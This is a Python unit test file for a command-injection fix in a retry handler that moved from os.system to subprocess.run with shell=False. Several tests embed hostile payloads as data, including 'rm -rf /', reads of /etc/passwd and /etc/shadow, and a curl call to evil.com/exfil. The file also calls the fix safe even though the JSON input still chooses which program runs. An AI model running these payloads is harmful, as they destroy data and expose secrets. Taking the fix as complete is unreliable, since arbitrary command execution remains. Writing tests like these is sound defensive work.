"""
Tests for RetryProducerHandler – focusing on the command-injection remediation.

The vulnerability (CWE-77 Stored Command Injection) was that user-controlled
JSON data flowed into os.system(), allowing shell metacharacters to spawn
arbitrary commands.  The fix replaces os.system() with subprocess.run()
called with shell=False and shlex.split() so that every token in the command
string is treated as a literal argument, never interpreted by the shell.

These tests verify:
1. Normal (benign) commands are still dispatched correctly.
2. Shell-injection payloads are NOT executed as shell commands.
3. subprocess.run is called with shell=False (SAST-recognisable safe API).
4. shlex.split() tokenisation is applied before the call (no raw string to shell).
"""

import json
import shlex
import unittest
from unittest.mock import MagicMock, patch, call

from retry_prdocuer_handler import RetryProducerHandler


class TestSkipRetryNoCommandInjection(unittest.TestCase):
    """Unit tests for RetryProducerHandler.skip_retry()."""

    def setUp(self):
        self.handler = RetryProducerHandler(event=None, submission_id="SUB-001")

    # ------------------------------------------------------------------
    # 1. subprocess.run must be called, NOT os.system
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_subprocess_run_is_used_not_os_system(self, mock_run):
        """os.system must never be invoked; subprocess.run must be called instead."""
        self.handler.skip_retry(input="echo hello", submission_id="S1")
        mock_run.assert_called_once()

    # ------------------------------------------------------------------
    # 2. shell=False must be enforced
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_shell_is_false(self, mock_run):
        """subprocess.run must always be invoked with shell=False."""
        self.handler.skip_retry(input="echo hello", submission_id="S1")
        _, kwargs = mock_run.call_args
        self.assertIn("shell", kwargs, "shell keyword argument must be present")
        self.assertFalse(kwargs["shell"], "shell must be False to prevent injection")

    # ------------------------------------------------------------------
    # 3. Command string is split into a list (shlex.split) before the call
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_command_is_tokenised_as_list(self, mock_run):
        """The first positional argument to subprocess.run must be a list, not a string."""
        self.handler.skip_retry(input="ping -c 1 localhost", submission_id="S1")
        args, _ = mock_run.call_args
        cmd_arg = args[0]
        self.assertIsInstance(cmd_arg, list, "Command must be passed as a list to subprocess.run")
        self.assertEqual(cmd_arg, ["ping", "-c", "1", "localhost"])

    # ------------------------------------------------------------------
    # 4. Simple benign command dispatched correctly
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_benign_command_dispatched(self, mock_run):
        """A normal command should reach subprocess.run with the correct tokens."""
        self.handler.skip_retry(input="echo hello world", submission_id="S1")
        args, _ = mock_run.call_args
        self.assertEqual(args[0], ["echo", "hello", "world"])

    # ------------------------------------------------------------------
    # 5. Shell-injection payload: semicolon-chained command
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_semicolon_injection_is_not_shell_expanded(self, mock_run):
        """
        A payload like 'echo ok; rm -rf /' must NOT cause 'rm -rf /' to run.
        With shell=False the semicolon is a literal argument, not a separator.
        """
        malicious = "echo ok; rm -rf /"
        self.handler.skip_retry(input=malicious, submission_id="S1")
        args, kwargs = mock_run.call_args
        # The call must use shell=False
        self.assertFalse(kwargs.get("shell", True))
        # subprocess receives tokens as-is from shlex; the semicolon and
        # everything after it are literal strings, not shell operators.
        expected_tokens = shlex.split(malicious)
        self.assertEqual(args[0], expected_tokens)

    # ------------------------------------------------------------------
    # 6. Shell-injection payload: pipe operator
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_pipe_injection_is_not_shell_expanded(self, mock_run):
        """A pipe operator in the command must not create a shell pipeline."""
        malicious = "echo foo | cat /etc/passwd"
        self.handler.skip_retry(input=malicious, submission_id="S1")
        _, kwargs = mock_run.call_args
        self.assertFalse(kwargs.get("shell", True))

    # ------------------------------------------------------------------
    # 7. Shell-injection payload: command substitution $()
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_command_substitution_is_not_shell_expanded(self, mock_run):
        """$(evil) must not be executed as a subshell command."""
        malicious = "echo $(id)"
        self.handler.skip_retry(input=malicious, submission_id="S1")
        _, kwargs = mock_run.call_args
        self.assertFalse(kwargs.get("shell", True))

    # ------------------------------------------------------------------
    # 8. Shell-injection payload: && operator
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_and_operator_injection_is_not_shell_expanded(self, mock_run):
        """&& must not chain a second command."""
        malicious = "echo safe && curl http://evil.com/exfil"
        self.handler.skip_retry(input=malicious, submission_id="S1")
        _, kwargs = mock_run.call_args
        self.assertFalse(kwargs.get("shell", True))

    # ------------------------------------------------------------------
    # 9. Shell-injection payload: backtick substitution
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_backtick_injection_is_not_shell_expanded(self, mock_run):
        """Backtick command substitution must not be interpreted by the shell."""
        malicious = "echo `whoami`"
        self.handler.skip_retry(input=malicious, submission_id="S1")
        _, kwargs = mock_run.call_args
        self.assertFalse(kwargs.get("shell", True))


class TestProcessMethod(unittest.TestCase):
    """Integration-level tests for RetryProducerHandler.process()."""

    def setUp(self):
        self.handler = RetryProducerHandler(event=None, submission_id="SUB-002")

    # ------------------------------------------------------------------
    # 10. process() extracts the command from JSON and calls skip_retry
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_extracts_command_and_calls_subprocess(self, mock_run):
        """process() must parse the JSON and forward the command to subprocess.run."""
        payload = json.dumps({"command": "echo integration-test"})
        self.handler.process(payload)
        mock_run.assert_called_once()
        args, kwargs = mock_run.call_args
        self.assertEqual(args[0], ["echo", "integration-test"])
        self.assertFalse(kwargs.get("shell", True))

    # ------------------------------------------------------------------
    # 11. process() stores the parsed command in self.actual_event
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_stores_command_in_actual_event(self, mock_run):
        """After process(), self.actual_event should hold the parsed command string."""
        payload = json.dumps({"command": "ping localhost"})
        self.handler.process(payload)
        self.assertEqual(self.handler.actual_event, "ping localhost")

    # ------------------------------------------------------------------
    # 12. process() with a stored injection payload
    # ------------------------------------------------------------------

    @patch("retry_prdocuer_handler.subprocess.run")
    def test_process_stored_injection_payload_uses_shell_false(self, mock_run):
        """
        Simulate a 'stored' injection scenario: attacker-controlled data was
        persisted to storage and is now being replayed via process().
        subprocess.run must still be called with shell=False.
        """
        stored_payload = json.dumps({"command": "echo safe; cat /etc/shadow"})
        self.handler.process(stored_payload)
        _, kwargs = mock_run.call_args
        self.assertFalse(
            kwargs.get("shell", True),
            "Stored command injection must be blocked by shell=False",
        )

    # ------------------------------------------------------------------
    # 13. Invalid JSON raises an exception (not silently swallowed)
    # ------------------------------------------------------------------

    def test_process_raises_on_invalid_json(self):
        """process() should propagate json.JSONDecodeError for malformed input."""
        with self.assertRaises(json.JSONDecodeError):
            self.handler.process("not-valid-json")

    # ------------------------------------------------------------------
    # 14. Missing 'command' key raises KeyError (not silently swallowed)
    # ------------------------------------------------------------------

    def test_process_raises_on_missing_command_key(self):
        """process() should raise KeyError if the JSON lacks a 'command' field."""
        with self.assertRaises(KeyError):
            self.handler.process(json.dumps({"other_key": "value"}))

    # ------------------------------------------------------------------
    # 15. os.system is never imported or called
    # ------------------------------------------------------------------

    def test_os_system_not_called(self):
        """Verify that os.system is not invoked anywhere during process()."""
        import os as _os
        original_system = _os.system
        call_tracker = []
        _os.system = lambda cmd: call_tracker.append(cmd)

        try:
            with patch("retry_prdocuer_handler.subprocess.run"):
                self.handler.process(json.dumps({"command": "echo test"}))
            self.assertEqual(
                call_tracker,
                [],
                "os.system must not be called — it enables command injection",
            )
        finally:
            _os.system = original_system


if __name__ == "__main__":
    unittest.main()
